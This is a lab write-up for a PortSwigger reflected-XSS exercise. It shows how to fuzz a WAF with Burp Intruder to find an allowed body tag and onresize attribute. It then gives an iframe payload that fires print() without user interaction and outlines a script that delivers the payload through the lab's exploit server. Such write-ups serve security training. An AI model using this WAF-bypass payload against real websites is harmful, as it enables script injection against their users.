### Lab: Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

_____

Analysis and Exploit:

1. Simple search using the search function and sent it to **[BURP-REPEATER]**
    - method GET **/?search=%22**
    - input text in 
    ```html
    <section class=blog-header>
        <h1>2 search results for '"'</h1>
    <hr>
    </section>
    ```

2. Using the script tag to test **/?search=\<script>print('ics')\</script>**:
    - returns error message "Tag is not allowed"
    - status code 400

*! Using Cheatshhet provided by PortSwigger


3. Manual test for valid tags (using **[BURP-REPEATER]**)
    - valid tags found: \<body>

    - Test using **[BURP-INTRUDER]**, grep match on error "Tag is not allowwd"
        - **/?search=%3C§body§+onwheel%3Dprint%281%29%3E**
        List of valid tags:
            - body

4. Attribute test using **[BURP-INTRUDER]**, grep match on error "Attribute is not allowed"
    - **/?search=%3Cbody+§onwheel§%3Dprint%281%29%3E**    
    List of valid attributes  
        - onbeforeinput  
        - onratechange  
        - onresize
        - onscrollend 

5. The only duo tag/attributes that does not requires user input is body/onresize
    - payload is ```<body onresize="print()">```

6. Payload is
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

**iframe** tag is used to embed another document within the current HTML document   
**src** tag is the source where to find the document to embed with the search field already filled  
**onload** event needed to cause a resize of the iframe content and trigger the **onresize** event with no user interactions

_____

Script:

1. Take 2 arguments | URL, EXPLOIT-SERVER-URL
    - if wrong number of arguments, print usage instructions

2. Build the payload
    ```html
    <iframe src="[URL]/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>```

3. Store the payload onto the exploit server | POST ESU **/** | params: urlIsHttps, responseFile, responseHead, responseBody, formAction
    - urlIsHttps: on
    - responseFile: /xss
    - responseHead: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody: **payload**
    - formAction: DELIVER_TO_VICTIM

4. Deliver the payload to the victim | GET ESU **/deliver-to-victim**

5. Check if exploit worked | GET U **/**
    - if "Congratulations, you solved the lab!" in response: exploit worked!





